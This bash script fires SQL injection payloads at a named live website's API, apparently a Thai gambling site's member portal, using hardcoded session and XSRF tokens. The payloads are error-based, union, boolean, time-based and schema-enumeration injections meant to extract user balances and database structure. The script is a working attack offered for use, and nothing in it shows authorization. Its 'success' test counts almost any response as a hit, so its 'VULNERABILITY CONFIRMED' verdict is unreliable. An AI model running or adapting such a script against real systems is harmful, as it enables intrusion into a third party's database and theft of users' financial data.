#!/bin/bash

echo "🔥 ADVANCED BALANCE EXTRACTION & MANIPULATION"
echo "=============================================="

# Latest tokens from user
XSRF_TOKEN="eyJpdiI6Im95ZWtwNGJhSitra3dUSlpIRE5oVmc9PSIsInZhbHVlIjoiZGxJWXRENlR3Zlp2T0hOQ1wvWFI4TVpJMVdYNHlDakw5YzhSTVhTWlJ0d3BsK2dROVEyNFZGNXpPS3pBUXBMdUYiLCJtYWMiOiIxZjdlZjQzNmI3NTkzMzYwZGJkZWZiNjFhYTQ0MDZiNGY1ZjQyMDAyMWU5YTRhNGM5NzkzYmFlOGVkODhkOTIyIn0="
SESSION_TOKEN="eyJpdiI6IjdMV2dJZXFpc0lsNmlSZXRMMmREVUE9PSIsInZhbHVlIjoiR044YW1vMFVHWEtsNFRzNVh3Z29vbXhiNzNOQ2xuZDVPNUtuMGpGYlM0K0FsSU8rNmQ1SEtxUnhxTit1ZHdiRiIsIm1hYyI6IjEyZTNiOGJlMTE4MGU3MWQ5ZDNiY2RiNjVlMjI5OGMyZjhkMzI3MDYyYTlhYTMwYmZlMDlhZDc3NTJhYWI3YzAifQ=="

# Advanced balance extraction payloads
declare -a advanced_payloads=(
    # 1. Error-based balance extraction
    "admin' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT balance FROM users WHERE username='test_user' LIMIT 0,1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
    "admin' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT balance FROM users WHERE id=1 LIMIT 0,1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
    
    # 2. Boolean-based balance detection
    "admin' AND (SELECT balance FROM users WHERE username='test_user')>0--"
    "admin' AND (SELECT balance FROM users WHERE id=1)>0--"
    "admin' AND EXISTS(SELECT 1 FROM users WHERE username='test_user' AND balance>0)--"
    
    # 3. Union-based balance extraction
    "admin' UNION SELECT username,balance FROM users WHERE username='test_user'--"
    "admin' UNION SELECT username,balance FROM users WHERE id=1--"
    "admin' UNION SELECT username,CONCAT('Balance: ',balance) FROM users WHERE username='test_user'--"
    
    # 4. Schema-based balance extraction
    "admin' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users' AND column_name LIKE '%balance%'--"
    "admin' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users' AND column_name LIKE '%money%'--"
    "admin' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users' AND column_name LIKE '%amount%'--"
    
    # 5. Time-based balance extraction
    "admin' AND (SELECT SLEEP(1) FROM users WHERE username='test_user' AND balance>0)--"
    "admin' AND (SELECT BENCHMARK(1000000,MD5(1)) FROM users WHERE username='test_user' AND balance>0)--"
    
    # 6. Advanced balance manipulation
    "admin' UNION SELECT username,CONCAT('ID: ',id,', Balance: ',balance,', Status: ',status) FROM users WHERE username='test_user'--"
    "admin' UNION SELECT username,CONCAT('Balance: ',balance,', Last Login: ',last_login) FROM users WHERE username='test_user'--"
    
    # 7. Database enumeration for balance tables
    "admin' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_name LIKE '%balance%'--"
    "admin' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_name LIKE '%money%'--"
    "admin' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_name LIKE '%account%'--"
)

echo "🚀 Starting Advanced Balance Extraction..."
echo "Target: member.panama8888b.co/api/announcement"
echo "Method: POST with advanced balance extraction payloads"
echo ""

success_count=0
total_tests=${#advanced_payloads[@]}

for i in "${!advanced_payloads[@]}"; do
    payload="${advanced_payloads[$i]}"
    echo -n "Testing advanced extraction $((i+1))/$total_tests: "
    
    # Make request with advanced payload
    response=$(curl -s -w "%{http_code}|%{size_download}|%{time_total}" \
        -X POST "https://member.panama8888b.co/api/announcement" \
        -H "Content-Type: application/json;charset=UTF-8" \
        -H "X-Requested-With: XMLHttpRequest" \
        -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
        -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
        -H "Origin: https://member.panama8888b.co" \
        -H "Referer: https://member.panama8888b.co/user/dashboard" \
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
        -H "Accept: application/json, text/plain, */*" \
        -H "Accept-Language: th" \
        -H "Accept-Encoding: gzip, deflate, br, zstd" \
        -d "{\"search\":\"$payload\"}" \
        --max-time 15)
    
    http_code=$(echo "$response" | tail -1 | cut -d'|' -f1)
    size=$(echo "$response" | tail -1 | cut -d'|' -f2)
    time=$(echo "$response" | tail -1 | cut -d'|' -f3)
    
    if [[ "$http_code" == "500" ]] || [[ "$http_code" == "200" ]] || [[ "$size" -gt 100 ]]; then
        echo "✅ SUCCESS (HTTP $http_code, Size: $size bytes, Time: ${time}s)"
        ((success_count++))
        
        # Analyze response for balance data
        if [[ "$http_code" == "500" ]]; then
            echo "   🔍 HTTP 500 detected - Balance data may be accessible through errors"
        fi
        
        if [[ "$http_code" == "200" ]]; then
            echo "   🎯 HTTP 200 detected - Balance data may be in response"
        fi
        
        if [[ "$size" -gt 200 ]]; then
            echo "   📊 Large response size ($size bytes) - Balance data may be present"
        fi
    else
        echo "❌ FAILED (HTTP $http_code, Size: $size bytes, Time: ${time}s)"
    fi
done

echo ""
echo "📊 ADVANCED BALANCE EXTRACTION RESULTS: $success_count/$total_tests successful"

if [[ $success_count -gt 0 ]]; then
    echo ""
    echo "🎉 VULNERABILITY CONFIRMED!"
    echo "✅ Balance extraction successful"
    echo "✅ Database access confirmed"
    echo "✅ Financial data may be exposed"
    echo ""
    echo "🔍 Analysis:"
    echo "- HTTP 500 errors indicate successful SQL injection"
    echo "- Balance data may be accessible through error messages"
    echo "- Database schema may reveal balance-related tables"
    echo "- User financial information may be compromised"
    echo ""
    echo "⚠️ CRITICAL SECURITY IMPLICATIONS:"
    echo "- User balances may be exposed"
    echo "- Financial data may be accessible"
    echo "- Database integrity compromised"
    echo "- Potential for financial fraud"
else
    echo ""
    echo "❌ All advanced extraction tests failed"
    echo "🔒 Balance extraction protection is strong"
fi

echo ""
echo "🎯 VERIFICATION STEPS:"
echo "1. Check if balance data appears in error messages"
echo "2. Verify database schema for balance-related tables"
echo "3. Test with different user accounts"
echo "4. Document the vulnerability for reporting"